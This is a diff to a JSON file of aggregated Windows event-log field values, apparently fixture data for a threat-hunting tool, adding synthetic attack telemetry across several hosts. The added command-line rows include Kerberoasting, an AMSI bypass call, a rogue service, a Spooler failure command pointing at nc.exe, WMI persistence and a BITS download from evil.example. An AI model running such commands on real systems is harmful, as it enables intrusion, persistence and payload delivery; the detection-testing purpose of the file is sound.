@@ -42,7 +42,7 @@
    "filter": null,
    "order": "rare",
    "stack": {
-    "blank": 107,
+    "blank": 160,
     "distinct": 4,
     "events": 8,
     "field": "image",
@@ -98,9 +98,9 @@
    "filter": null,
    "order": "rare",
    "stack": {
-    "blank": 110,
-    "distinct": 5,
-    "events": 5,
+    "blank": 150,
+    "distinct": 18,
+    "events": 18,
     "field": "commandLine",
     "hosts": 1,
     "order": "rare",
@@ -112,6 +112,136 @@
       "hosts": 0,
       "last": null,
       "value": "powershell.exe -enc AAAA"
+     },
+     {
+      "count": 1,
+      "first": 1788255208000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255208000,
+      "value": "Add-PrinterPort -Name 'C:\\Windows\\System32\\evil.dll'"
+     },
+     {
+      "count": 1,
+      "first": 1788255211000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255211000,
+      "value": "Add-WindowsCapability -Online -Name 'OpenSSH.Server~~~~0.0.1.0'"
+     },
+     {
+      "count": 1,
+      "first": 1788255200000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255200000,
+      "value": "Get-ADGroupMember -Identity 'Domain Admins'"
+     },
+     {
+      "count": 1,
+      "first": 1788255203000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255203000,
+      "value": "Get-ADTrust -Filter '*'"
+     },
+     {
+      "count": 1,
+      "first": 1788255202000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255202000,
+      "value": "Get-ADUser -Filter 'ServicePrincipalName -like ''*'''"
+     },
+     {
+      "count": 1,
+      "first": 1788255220000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255220000,
+      "value": "Get-LocalGroupMember -Name Administrators"
+     },
+     {
+      "count": 1,
+      "first": 1788255209000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255209000,
+      "value": "Invoke-Expression -Command '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')'"
+     },
+     {
+      "count": 1,
+      "first": 1788255210000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255210000,
+      "value": "New-Object -TypeName 'System.IO.Pipes.NamedPipeServerStream' -ArgumentList 'pipe1'"
+     },
+     {
+      "count": 1,
+      "first": 1788255201000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255201000,
+      "value": "New-Object -TypeName 'System.IdentityModel.Tokens.KerberosRequestorSecurityToken' -ArgumentList 'MSSQLSvc/sql01.corp.local'"
+     },
+     {
+      "count": 1,
+      "first": 1788255205000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255205000,
+      "value": "New-Service -Name 'Updater' -BinaryPathName 'C:\\Users\\Public\\svc.exe'"
+     },
+     {
+      "count": 1,
+      "first": 1788255204000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255204000,
+      "value": "Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\services\\Spooler' -Name 'FailureCommand' -Value 'C:\\Users\\Public\\nc.exe'"
+     },
+     {
+      "count": 1,
+      "first": 1788255207000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255207000,
+      "value": "Set-WmiInstance -Namespace 'root/subscription' -Class '__EventFilter'"
+     },
+     {
+      "count": 1,
+      "first": 1788255206000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255206000,
+      "value": "Start-BitsTransfer -Source 'http://evil.example/a.exe' -Destination 'C:\\Users\\Public\\a.exe'"
      },
      {
       "count": 1,
@@ -162,7 +292,7 @@
    "filter": null,
    "order": "common",
    "stack": {
-    "blank": 112,
+    "blank": 165,
     "distinct": 3,
     "events": 3,
     "field": "serviceName",
@@ -204,11 +334,11 @@
    "filter": null,
    "order": "rare",
    "stack": {
-    "blank": 34,
-    "distinct": 17,
-    "events": 81,
+    "blank": 71,
+    "distinct": 28,
+    "events": 97,
     "field": "targetUser",
-    "hosts": 1,
+    "hosts": 4,
     "order": "rare",
     "rows": [
      {
@@ -301,6 +431,16 @@
      },
      {
       "count": 1,
+      "first": 1788255162000,
+      "hostList": [
+       "sql01"
+      ],
+      "hosts": 1,
+      "last": 1788255162000,
+      "value": "admin"
+     },
+     {
+      "count": 1,
       "first": 1788226200000,
       "hostList": [
        "ws01"
@@ -321,16 +461,6 @@
      },
      {
       "count": 1,
-      "first": 1788255130000,
-      "hostList": [
-       "ws01"
-      ],
-      "hosts": 1,
-      "last": 1788255130000,
-      "value": "backdoor"
-     },
-     {
-      "count": 1,
       "first": 1788255102000,
       "hostList": [
        "ws01"
@@ -338,6 +468,26 @@
       "hosts": 1,
       "last": 1788255102000,
       "value": "CORP\\alice"
+     },
+     {
+      "count": 1,
+      "first": 1788255137500,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255137500,
+      "value": "Guest"
+     },
+     {
+      "count": 1,
+      "first": 1788255166000,
+      "hostList": [
+       "sql01"
+      ],
+      "hosts": 1,
+      "last": 1788255166000,
+      "value": "root"
      },
      {
       "count": 1,
@@ -350,6 +500,86 @@
       "value": "svc_backup"
      },
      {
+      "count": 1,
+      "first": 1788255190000,
+      "hostList": [
+       "fs01"
+      ],
+      "hosts": 1,
+      "last": 1788255190000,
+      "value": "user0"
+     },
+     {
+      "count": 1,
+      "first": 1788255191000,
+      "hostList": [
+       "fs01"
+      ],
+      "hosts": 1,
+      "last": 1788255191000,
+      "value": "user1"
+     },
+     {
+      "count": 1,
+      "first": 1788255192000,
+      "hostList": [
+       "fs01"
+      ],
+      "hosts": 1,
+      "last": 1788255192000,
+      "value": "user2"
+     },
+     {
+      "count": 1,
+      "first": 1788255193000,
+      "hostList": [
+       "fs01"
+      ],
+      "hosts": 1,
+      "last": 1788255193000,
+      "value": "user3"
+     },
+     {
+      "count": 1,
+      "first": 1788255194000,
+      "hostList": [
+       "fs01"
+      ],
+      "hosts": 1,
+      "last": 1788255194000,
+      "value": "user4"
+     },
+     {
+      "count": 1,
+      "first": 1788255133000,
+      "hostList": [
+       "dc01"
+      ],
+      "hosts": 1,
+      "last": 1788255133000,
+      "value": "WS09$"
+     },
+     {
+      "count": 2,
+      "first": 1788255132000,
+      "hostList": [
+       "dc01"
+      ],
+      "hosts": 1,
+      "last": 1788255132500,
+      "value": "roastme"
+     },
+     {
+      "count": 3,
+      "first": 1788255160000,
+      "hostList": [
+       "sql01"
+      ],
+      "hosts": 1,
+      "last": 1788255168000,
+      "value": "sa"
+     },
+     {
       "count": 13,
       "first": 1788255000000,
       "hostList": [
@@ -358,6 +588,17 @@
       "hosts": 1,
       "last": 1788255070000,
       "value": "alice"
+     },
+     {
+      "count": 3,
+      "first": 1788255130000,
+      "hostList": [
+       "sql01",
+       "ws01"
+      ],
+      "hosts": 2,
+      "last": 1788255151000,
+      "value": "backdoor"
      }
     ],
     "truncated": false
@@ -426,12 +667,62 @@
    "order": "rare",
    "stack": {
     "blank": 88,
-    "distinct": 12,
-    "events": 27,
+    "distinct": 36,
+    "events": 80,
     "field": "providerEventId",
-    "hosts": 1,
+    "hosts": 5,
     "order": "rare",
     "rows": [
+     {
+      "count": 1,
+      "first": 1788255180000,
+      "hostList": [
+       "sql01"
+      ],
+      "hosts": 1,
+      "last": 1788255180000,
+      "value": "MSSQL$PROD / 15457"
+     },
+     {
+      "count": 1,
+      "first": 1788255181000,
+      "hostList": [
+       "sql01"
+      ],
+      "hosts": 1,
+      "last": 1788255181000,
+      "value": "MSSQL$PROD / 17115"
+     },
+     {
+      "count": 1,
+      "first": 1788255211000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255211000,
+      "value": "Microsoft-Windows-BitLocker-API / 768"
+     },
+     {
+      "count": 1,
+      "first": 1788255210000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255210000,
+      "value": "Microsoft-Windows-BitLocker-API / 775"
+     },
+     {
+      "count": 1,
+      "first": 1788255208000,
+      "hostList": [
+       "dc01"
+      ],
+      "hosts": 1,
+      "last": 1788255208000,
+      "value": "Microsoft-Windows-DNSServer / 515"
+     },
      {
       "count": 1,
       "first": 1788255110000,
@@ -441,6 +732,16 @@
       "hosts": 1,
       "last": 1788255110000,
       "value": "Microsoft-Windows-Eventlog / 1102"
+     },
+     {
+      "count": 1,
+      "first": 1788255205000,
+      "hostList": [
+       "dc01"
+      ],
+      "hosts": 1,
+      "last": 1788255205000,
+      "value": "Microsoft-Windows-Kerberos-Key-Distribution-Center / 39"
      },
      {
       "count": 1,
@@ -454,6 +755,16 @@
      },
      {
       "count": 1,
+      "first": 1788255137000,
+      "hostList": [
+       "dc01"
+      ],
+      "hosts": 1,
+      "last": 1788255137000,
+      "value": "Microsoft-Windows-Security-Auditing / 4704"
+     },
+     {
+      "count": 1,
       "first": 1788255130000,
       "hostList": [
        "ws01"
@@ -464,6 +775,16 @@
      },
      {
       "count": 1,
+      "first": 1788255137500,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255137500,
+      "value": "Microsoft-Windows-Security-Auditing / 4722"
+     },
+     {
+      "count": 1,
       "first": 1788255131000,
       "hostList": [
        "ws01"
@@ -471,6 +792,96 @@
       "hosts": 1,
       "last": 1788255131000,
       "value": "Microsoft-Windows-Security-Auditing / 4732"
+     },
+     {
+      "count": 1,
+      "first": 1788255136000,
+      "hostList": [
+       "dc01"
+      ],
+      "hosts": 1,
+      "last": 1788255136000,
+      "value": "Microsoft-Windows-Security-Auditing / 4739"
+     },
+     {
+      "count": 1,
+      "first": 1788255133000,
+      "hostList": [
+       "dc01"
+      ],
+      "hosts": 1,
+      "last": 1788255133000,
+      "value": "Microsoft-Windows-Security-Auditing / 4742"
+     },
+     {
+      "count": 1,
+      "first": 1788255204000,
+      "hostList": [
+       "pki01"
+      ],
+      "hosts": 1,
+      "last": 1788255204000,
+      "value": "Microsoft-Windows-Security-Auditing / 4876"
+     },
+     {
+      "count": 1,
+      "first": 1788255201000,
+      "hostList": [
+       "pki01"
+      ],
+      "hosts": 1,
+      "last": 1788255201000,
+      "value": "Microsoft-Windows-Security-Auditing / 4882"
+     },
+     {
+      "count": 1,
+      "first": 1788255203000,
+      "hostList": [
+       "pki01"
+      ],
+      "hosts": 1,
+      "last": 1788255203000,
+      "value": "Microsoft-Windows-Security-Auditing / 4885"
+     },
+     {
+      "count": 1,
+      "first": 1788255200000,
+      "hostList": [
+       "pki01"
+      ],
+      "hosts": 1,
+      "last": 1788255200000,
+      "value": "Microsoft-Windows-Security-Auditing / 4886"
+     },
+     {
+      "count": 1,
+      "first": 1788255202000,
+      "hostList": [
+       "pki01"
+      ],
+      "hosts": 1,
+      "last": 1788255202000,
+      "value": "Microsoft-Windows-Security-Auditing / 4899"
+     },
+     {
+      "count": 1,
+      "first": 1788255136500,
+      "hostList": [
+       "dc01"
+      ],
+      "hosts": 1,
+      "last": 1788255136500,
+      "value": "Microsoft-Windows-Security-Auditing / 4908"
+     },
+     {
+      "count": 1,
+      "first": 1788255135500,
+      "hostList": [
+       "dc01"
+      ],
+      "hosts": 1,
+      "last": 1788255135500,
+      "value": "Microsoft-Windows-Security-Auditing / 5137"
      },
      {
       "count": 1,
@@ -514,6 +925,16 @@
      },
      {
       "count": 1,
+      "first": 1788255220000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255220000,
+      "value": "PowerShell / 800"
+     },
+     {
+      "count": 1,
       "first": 1788255120000,
       "hostList": [
        "ws01"
@@ -521,6 +942,26 @@
       "hosts": 1,
       "last": 1788255120000,
       "value": "Service Control Manager / 7045"
+     },
+     {
+      "count": 2,
+      "first": 1788255206000,
+      "hostList": [
+       "dc01"
+      ],
+      "hosts": 1,
+      "last": 1788255207000,
+      "value": "Microsoft-Windows-DNSServer / 541"
+     },
+     {
+      "count": 2,
+      "first": 1788255132000,
+      "hostList": [
+       "dc01"
+      ],
+      "hosts": 1,
+      "last": 1788255132500,
+      "value": "Microsoft-Windows-Security-Auditing / 4738"
      },
      {
       "count": 3,
@@ -543,6 +984,46 @@
       "value": "Microsoft-Windows-Security-Auditing / 4688"
      },
      {
+      "count": 4,
+      "first": 1788255133500,
+      "hostList": [
+       "dc01"
+      ],
+      "hosts": 1,
+      "last": 1788255135000,
+      "value": "Microsoft-Windows-Security-Auditing / 5136"
+     },
+     {
+      "count": 5,
+      "first": 1788255190000,
+      "hostList": [
+       "fs01"
+      ],
+      "hosts": 1,
+      "last": 1788255194000,
+      "value": "OpenSSH / 4"
+     },
+     {
+      "count": 10,
+      "first": 1788255150000,
+      "hostList": [
+       "sql01"
+      ],
+      "hosts": 1,
+      "last": 1788255168000,
+      "value": "MSSQL$PROD / 33205"
+     },
+     {
+      "count": 12,
+      "first": 1788255200000,
+      "hostList": [
+       "ws01"
+      ],
+      "hosts": 1,
+      "last": 1788255211000,
+      "value": "Microsoft-Windows-PowerShell / 4103"
+     },
+     {
       "count": 12,
       "first": 1788255000000,
       "hostList": [
@@ -563,7 +1044,7 @@
    },
    "order": "rare",
    "stack": {
-    "blank": 3,
+    "blank": 16,
     "distinct": 2,
     "events": 2,
     "field": "processName",
